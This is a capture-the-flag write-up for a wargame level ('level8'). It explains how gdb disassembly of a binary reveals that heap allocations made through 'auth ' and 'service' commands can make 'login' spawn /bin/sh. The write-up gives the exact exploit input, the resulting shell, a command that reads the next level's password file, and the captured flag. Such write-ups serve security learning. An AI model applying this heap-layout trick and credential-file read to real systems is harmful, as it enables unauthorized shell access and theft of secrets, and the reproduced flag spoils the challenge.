# level8

In this level, all we have to do is analyse the code...
```bash
> ./level8
(nil), (nil)
<text-input>
(nil), (nil)
test
(nil), (nil)
CTRL-D
```

Ok so let's disassemble the code with gdb and trying to understand all (see source).

If we send `auth ` (be careful to the space after auth), this create a malloc of size 4 (VAR_2)

If we send `reset`, this free the VAR_2

If we send `service` (or `servic`), this duplicate all the text after `service` in VAR_1 (if `service012345` -> VAR_1 = `012345`).

If we send `login`:
- If VAR_2 (created by `auth `) + 32 is `0`, write `Password:` and continue.
- Else, open `/bin/sh` <- this is the goal.

# Exploit

The VAR_2 + 32 char is undefined at start but if we create a new string with service, this string will be after VAR_2 in memory.

So all we have to do is to create the VAR_2, then create a VAR_1 (with more than 16 char to create a 24 oct allocation).

```bash
> ./level8
(nil), (nil)
auth    ; dont forget the space after auth: "auth "
0x804a008, (nil)
service0123456701234567  ; there is 16 char + '\n' so 17 in total
0x804a008, 0x804a018
login
/bin/sh: 1: nonzero_return: not found
\[\e[32m\]\u\[\e[m\] \[\e[33m\]\w\[\e[m\] \[\e[31m\]\[\e[m\]$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```



---
```
// auth
x/s 0x08049aac
// service
x/s 0x08049ab0
```

```
p/d 0x08049ab0 - 0x08049aac
$1 = 4
```
```
service + 28  // (32 - 4)

"service 123456789abcdefghijklmnopqrs"
```
